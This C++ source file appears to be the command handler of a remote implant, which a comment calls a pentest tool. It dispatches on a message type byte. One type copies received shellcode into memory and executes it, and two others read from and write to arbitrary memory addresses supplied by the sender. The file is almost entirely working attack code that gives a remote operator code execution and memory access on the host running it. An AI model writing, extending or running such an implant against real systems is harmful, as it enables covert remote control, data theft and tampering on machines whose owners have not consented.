#include "global.hpp"
#include <sstream>
#include <iomanip>
string create_handshake();
typedef unsigned long long (*ShellcodeFunc)();

void printStringAsHex(const string& s) {
    for (unsigned char c : s) {
        cout << "0x"
             << hex << setw(2) << setfill('0')
             << static_cast<int>(c) << ' ';
    }
    cout << dec << '\n';
}
string to_hex(const uint8_t* data, size_t len) {
    static const char* hex = "0123456789abcdef";
    string out;
    out.reserve(len * 2);

    for (size_t i = 0; i < len; i++) {
        out.push_back(hex[data[i] >> 4]);
        out.push_back(hex[data[i] & 0xF]);
    }

    return out;
}

string handleMessage(string& msg, PVOID mem) {
    if (msg.empty()) {
        return "";
    }

    uint8_t type = (uint8_t) msg[0];

    switch (type) {
        case 0x00:{
            string retval = create_handshake();
            return retval;
        }
        case 0x01:{
            QWORD shellcode_size = *((QWORD*)msg.substr(1).c_str());
            string shellcode = msg.substr(1+8,shellcode_size);
            memcpy(mem, shellcode.c_str(), shellcode_size);
            ShellcodeFunc exec = (ShellcodeFunc)(mem);
            unsigned long long retval = exec();
            string s_retval = string(1,1) + string((char*)(&retval), 8);
            return s_retval;
            break;
        }
        case 0x02: {
        
        // Check if message has enough header data (1 byte type + 8 bytes addr + 8 bytes len)
        if (msg.size() < 17) {
            return string(1, 0x01) + "ERROR: SHORT_MSG";
        }

        // Extract Address and Length from the message string
        uint64_t startAddr;
        uint64_t readLen;
        memcpy(&startAddr, msg.data() + 1, 8);
        memcpy(&readLen, msg.data() + 9, 8);


        // Use a stringstream to build the hex response or return raw bytes
        // For a pentest tool, returning raw bytes is usually more efficient
        string s_retval = string(1, 0x01); // Header indicating success/type 1
        
        s_retval.append(reinterpret_cast<const char*>(startAddr), readLen);


        
        // Return the response (Type byte + hex string)
        return s_retval;
        break;
        }

        case 0x03:{
            uint64_t writeAddr;
            uint64_t writeLen;
            memcpy(&writeAddr, msg.data()+1, 8);
            memcpy(&writeLen, msg.data()+9, 8);

            memcpy((PVOID)writeAddr, msg.data()+17, writeLen);
            string s_retval = string(1, 0x01);
            return s_retval;

            break;
        }
        default:
            break;
    }
    return "";
}